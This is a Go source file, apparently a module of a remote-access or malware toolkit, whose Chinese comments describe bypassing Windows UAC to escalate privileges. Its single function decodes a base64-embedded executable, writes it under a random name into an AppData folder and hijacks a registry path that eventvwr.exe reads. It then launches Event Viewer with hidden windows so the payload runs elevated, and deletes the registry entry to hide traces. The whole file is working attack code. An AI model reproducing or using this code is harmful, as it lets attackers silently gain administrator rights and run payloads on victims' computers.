/*
Author: FreeKnight
UAC跳过提权
 */
//------------------------------------------------------------
package components
//------------------------------------------------------------
import (
	"encoding/base64"
	"os"
	"os/exec"
	"syscall"
)
//------------------------------------------------------------
// 让一个文件绕过UAC提权
func uacBypass(file string) bool {
	n := randomString(5, false)
	Binary, _ := os.Create(tmpAppDataInstallDir + n + ".exe")
	DecodedBinary, _ := base64.StdEncoding.DecodeString(file)
	Binary.WriteString(string(DecodedBinary))
	Binary.Close()
	cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", bypassPath, "/d", tmpAppDataInstallDir +n+".exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err := cmd.Output()
	if err != nil {
		return false
	}
	c := exec.Command("cmd", "/C", "eventvwr.exe")
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := c.Run(); err != nil {
		return false
	}
	cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", bypassPathAlt, "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return false
	}
	return true
}
//------------------------------------------------------------